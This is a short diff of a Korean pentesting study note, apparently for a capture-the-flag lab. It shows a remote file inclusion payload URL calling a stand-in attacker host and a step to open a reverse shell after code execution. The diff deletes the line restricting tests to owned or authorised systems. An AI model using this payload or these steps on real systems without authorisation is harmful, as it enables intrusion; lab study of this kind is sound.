@@ -42,4 +42,3 @@ http://target/index.php?lang=http://attacker.thm/cmd.txt
 
 - 발견한 파라미터와 payload, 응답을 노트(05-progress-tracker)에 기록한다.
 - 원격 코드 실행까지 이어지면 리버스 쉘 연결을 시도한다.
-- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
